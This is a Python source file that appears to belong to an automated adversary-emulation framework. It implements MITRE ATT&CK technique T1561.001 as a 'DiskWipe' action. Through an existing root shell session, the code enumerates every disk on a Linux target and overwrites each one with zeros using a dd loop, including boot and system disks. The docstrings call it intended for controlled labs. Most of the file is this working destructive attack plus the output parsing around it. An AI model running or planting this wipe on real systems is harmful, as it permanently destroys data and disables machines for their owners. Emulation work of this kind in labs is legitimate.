from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, Pattern
from kg_api.query import Query
from Session import SessionManager
from motifs import ActionInputMotif, ActionOutputMotif, StateChangeOperation


class DiskWipe(Action):
    """
    Implementation of T1561.001 Disk Wipe - Disk Content Wipe.

    This action wipes disk content on Linux systems by overwriting block devices.
    It is intentionally destructive and is intended for controlled lab environments.
    """

    # Shell-capable protocols for running commands
    # Note: RSH is excluded because RSH sessions are stored as dicts and don't support run_command
    SHELL_PROTOCOLS = ["ssh", "shell", "busybox"]
    
    # Constants for output parsing
    WIPING_PREFIX = "Wiping /dev/"
    COMPLETION_MESSAGE = "Disk wipe completed"
    DEVICE_PREFIX = "/dev/"

    def __init__(self):
        super().__init__("DiskWipe", "T1561.001", "TA0040", ["loud", "slow"])
        self.noise = 1.0
        self.impact = 1.0
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """
        Build the input motif for DiskWipe.

        Requires:
        - An Asset
        - A shell-capable service on that asset
        - An active session executing on that service
        - The session user should already be root (or equivalent), enforced in get_target_query
        """
        input_motif = ActionInputMotif(
            name="InputMotif_DiskWipe",
            description="Input motif for DiskWipe",
        )

        # Asset
        input_motif.add_template(
            entity=Entity("Asset", alias="asset"),
            template_name="existing_asset",
        )

        # Open port on the asset
        input_motif.add_template(
            entity=Entity("OpenPort", alias="port"),
            template_name="existing_port",
            relationship_type="has",
            match_on="existing_asset",
            invert_relationship=True,
        )

        # Service running on the port
        input_motif.add_template(
            entity=Entity("Service", alias="service"),
            template_name="existing_service",
            relationship_type="is_running",
            match_on="existing_port",
            invert_relationship=True,
        )

        # Active session executing on the service
        input_motif.add_template(
            entity=Entity("Session", alias="session", active=True),
            template_name="existing_session",
            relationship_type="executes_on",
            match_on="existing_service",
        )

        return input_motif

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """
        Build the output motif for DiskWipe.
        
        Creates Drive entities for wiped disk devices and marks them as inactive.
        """
        output_motif = ActionOutputMotif(
            name="OutputMotif_DiskWipe",
            description="Output motif for DiskWipe",
        )
        
        # Drive entity for each wiped device
        # Uses MERGE_IF_NOT_MATCH to update existing Drive entities or create new ones
        output_motif.add_template(
            template_name="wiped_drive",
            entity=Entity("Drive", alias="drive"),
            relationship_type="accesses",
            match_on=Entity("Asset", alias="asset"),
            invert_relationship=True,
            operation=StateChangeOperation.MERGE_IF_NOT_MATCH,
            expected_attributes=["location", "active"],
        )
        
        return output_motif

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Describe the expected outcome of the action.
        """
        asset = pattern.get("asset")
        asset_ip = asset.get("ip_address") if asset else "unknown"
        session = pattern.get("session")
        session_id = session._id if session else "unknown"
        service = pattern.get("service")
        service_protocol = service.get("protocol") if service else "unknown"

        return [
            f"Wipe disk content on {asset_ip} using {service_protocol} session ({session_id})"
        ]

    def get_target_query(self) -> Query:
        """
        Target patterns for disk wiping.

        Requirements:
        - Session protocol is shell-capable (ssh, shell, busybox)
        - Session user is root (username == 'root')
        """
        query = self.input_motif.get_query()

        session_template = self.input_motif.get_template("existing_session").entity
        service_template = self.input_motif.get_template("existing_service").entity

        # Shell-capable service protocols
        query.where(service_template.protocol.is_in(self.SHELL_PROTOCOLS))

        # Shell-capable session
        query.where(session_template.protocol.is_in(self.SHELL_PROTOCOLS))

        # Require root session (assumes prior privilege escalation actions)
        query.where(session_template.username == "root")

        query.ret_all()
        return query

    def function(
        self,
        sessions: SessionManager,
        artefacts: ArtefactManager,
        pattern: Pattern,
    ) -> ActionExecutionResult:
        """
        Execute disk wipe commands on the target host.

        Strategy:
        - Enumerate block devices using lsblk
        - For each device of type "disk", overwrite with zeros via dd
        - Best-effort: failures on individual devices do not stop the loop

        WARNING: This action will wipe ALL disk devices found on the system, including:
        - Boot disks
        - System disks
        - All data storage devices
        - No devices are excluded or protected

        This operation is EXTREMELY DESTRUCTIVE and will render the system completely
        unusable. All data on all disk devices will be permanently destroyed.
        This action is intended ONLY for controlled lab environments where complete
        system destruction is acceptable.

        Performance Notes:
        - Uses dd with 4MB block size and fdatasync for data synchronization
        - Expected duration: approximately 1-2 hours per 100GB of disk capacity
        - For a 1TB disk, expect 10-20 hours of execution time
        - The conv=fdatasync flag ensures data is actually written to disk but
          significantly slows down the operation
        - This action may take hours or days to complete on systems with large disks
        - The session must remain active for the entire duration
        """
        tulpa_session = pattern.get("session")
        tulpa_session_id = tulpa_session.get("id")
        live_session = sessions.get_session(tulpa_session_id)

        if not live_session:
            return ActionExecutionResult(
                command=[],
                stdout="No active session available",
                exit_status=1,
                session=tulpa_session_id,
            )

        # Enumerate and wipe ALL block devices of type "disk"
        # WARNING: This will wipe ALL disks including boot/system disks - no devices are excluded.
        # Try lsblk first, fall back to /proc/partitions if lsblk is not available
        check_cmd = "if command -v lsblk >/dev/null 2>&1; then lsblk -ndo NAME,TYPE 2>&1 | awk '$2==\"disk\" {print $1}'; else cat /proc/partitions 2>&1 | awk 'NR>2 && $4 !~ /^ram/ && $4 !~ /[0-9]$/ {print $4}'; fi"
        check_output = live_session.run_command(check_cmd)
        
        # Check for command failures
        # If both lsblk and /proc/partitions fail, output will be empty
        if not check_output.strip():
            return ActionExecutionResult(
                command=[check_cmd],
                stdout="lsblk command not available or failed to execute",
                exit_status=1,
                session=tulpa_session_id,
            )
        
        # Also check for error messages that might appear in output
        error_indicators = ["error", "permission denied", "cannot", "failed"]
        if any(indicator in check_output.lower() for indicator in error_indicators):
            return ActionExecutionResult(
                command=[check_cmd],
                stdout=check_output,
                exit_status=1,
                session=tulpa_session_id,
            )
        
        # If no devices found, still proceed but note it in output
        devices_found = [line.strip() for line in check_output.strip().split('\n') if line.strip()]
        
        if not devices_found:
            return ActionExecutionResult(
                command=[check_cmd],
                stdout="No disk devices found to wipe",
                exit_status=0,
                session=tulpa_session_id,
            )
        
        # Proceed with wiping devices
        # Using bs=4M (4MB blocks) for better performance than 1M
        # conv=fdatasync ensures data is written to disk but significantly slows operation
        # Expected: ~1-2 hours per 100GB, so a 1TB disk may take 10-20 hours
        # Use same device enumeration method as check
        cmd = (
            f"for dev in $(if command -v lsblk >/dev/null 2>&1; then lsblk -ndo NAME,TYPE 2>&1 | awk '$2==\"disk\" {{print $1}}'; else cat /proc/partitions 2>&1 | awk 'NR>2 && $4 !~ /^ram/ && $4 !~ /[0-9]$/ {{print $4}}'; fi); do "
            f"echo \"{DiskWipe.WIPING_PREFIX}$dev\"; "
            f"dd if=/dev/zero of={DiskWipe.DEVICE_PREFIX}$dev bs=4M status=none conv=fdatasync 2>&1 || echo \"ERROR: dd failed for $dev\"; "
            "done; "
            f"echo '{DiskWipe.COMPLETION_MESSAGE}'"
        )

        stdout = live_session.run_command(cmd)

        # Determine exit_status based on command execution results
        # Check for fundamental failures first
        if not stdout or not stdout.strip():
            # Empty output indicates command failed to execute or session issue
            exit_status = 1
        elif DiskWipe.COMPLETION_MESSAGE not in stdout:
            # Completion message missing indicates the loop didn't finish
            # This could mean lsblk failed, command syntax error, or session died
            exit_status = 1
        elif DiskWipe.WIPING_PREFIX not in stdout:
            # Completion message present but no devices were processed
            # This means the loop ran but found no devices (shouldn't happen if check passed)
            exit_status = 1
        else:
            # Success: completion message present and at least one device was processed
            exit_status = 0

        return ActionExecutionResult(
            command=[cmd],
            stdout=stdout,
            exit_status=exit_status,
            session=tulpa_session_id,
        )

    def parse_output(self, output: ActionExecutionResult) -> dict:
        """
        Parse the output to extract which devices were wiped.
        
        Uses robust parsing to handle device names that may contain special characters.
        """
        wiped_devices = []
        ran = False
        
        if output.stdout:
            for line in output.stdout.split("\n"):
                line = line.strip()
                if line.startswith(DiskWipe.WIPING_PREFIX):
                    # Extract device name using split for more robust parsing
                    # Format: "Wiping /dev/sda" -> extract "sda"
                    # Split on the prefix and take the part after it
                    parts = line.split(DiskWipe.WIPING_PREFIX, 1)
                    if len(parts) > 1:
                        device_part = parts[1].strip()
                        # Device should be in format /dev/NAME or just NAME
                        # Remove /dev/ prefix if present to get just the device name
                        if device_part.startswith(DiskWipe.DEVICE_PREFIX):
                            device = device_part[len(DiskWipe.DEVICE_PREFIX):].strip()
                        else:
                            device = device_part
                        
                        # Validate device name: should be non-empty and not contain newlines
                        # Device names are typically alphanumeric with possible dashes/underscores
                        # Additional validation: ensure it doesn't contain unexpected characters
                        if device and '\n' not in device:
                            # Further validate: device name should not be empty after stripping
                            # and should be a reasonable length (device names are usually short)
                            device_clean = device.strip()
                            if device_clean and len(device_clean) <= 255:  # Reasonable max length
                                wiped_devices.append(device_clean)
                elif DiskWipe.COMPLETION_MESSAGE in line:
                    ran = True
        
        return {
            "wipe_executed": ran,
            "success": output.exit_status == 0 and ran,
            "wiped_devices": wiped_devices,
        }

    def populate_output_motif(
        self,
        pattern: Pattern,
        discovered_data: dict,
    ) -> StateChangeSequence:
        """
        Populate the output motif with wiped drive information.
        
        Creates or updates Drive entities for each wiped device, marking them as inactive.
        
        Note: Only Drive entities are marked as inactive. Child entities (Directories, Files)
        are not updated due to framework limitations (no graph access in this method to query
        for child entities). This is acceptable as the drive-level marking indicates the
        entire drive has been wiped.
        """
        self.output_motif.reset_context()
        changes: StateChangeSequence = []
        
        if not discovered_data.get("success"):
            return changes
        
        asset = pattern.get("asset")
        wiped_devices = discovered_data.get("wiped_devices", [])
        
        for device in wiped_devices:
            # Create Drive entity with device path as location
            # Format: /dev/{device} (e.g., /dev/sda)
            drive_location = f"{DiskWipe.DEVICE_PREFIX}{device}"
            
            drive_change = self.output_motif.instantiate(
                template_name="wiped_drive",
                match_on_override=asset,
                location=drive_location,
                active=False,  # Mark as inactive after wiping
            )
            changes.append(drive_change)
        
        return changes

    def capture_state_change(
        self,
        artefacts: ArtefactManager,
        pattern: Pattern,
        output: ActionExecutionResult,
    ) -> StateChangeSequence:
        """
        Capture state changes from disk wipe.
        
        Marks wiped drives as inactive in the graph.
        """
        discovered_data = self.parse_output(output)
        changes = self.populate_output_motif(pattern, discovered_data)
        return changes
